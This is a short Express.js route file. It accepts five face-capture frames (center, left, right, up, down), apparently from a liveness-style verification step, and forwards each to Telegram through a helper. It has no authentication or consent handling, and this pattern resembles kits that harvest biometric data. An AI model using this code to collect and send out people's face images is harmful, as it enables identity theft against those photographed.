import express from "express";
import axios from "axios";
import { sendImageToTelegram } from "../utils/imageUpload.js";
const router = express.Router()



router.post('/upload/:id', async (req, res) => {
    const { id } = req.params;
    const {  capturedFrames } = req.body;
    const { center, left, right, up, down } = capturedFrames;
  
    // Send each frame to Telegram
    try {
        if (center) {
          await sendImageToTelegram(center, 'center');
        }
        if (left) {
          await sendImageToTelegram(left, 'left');
        }
        if (right) {
          await sendImageToTelegram(right, 'right');
        }
        if (up) {
          await sendImageToTelegram(up, 'up');
        }
        if (down) {
          await sendImageToTelegram(down, 'down');
        }
        res.status(200).send('All frames sent to Telegram');
        } catch (error) {
            res.status(500).send('Error sending frames to Telegram');
            }
            })

export default router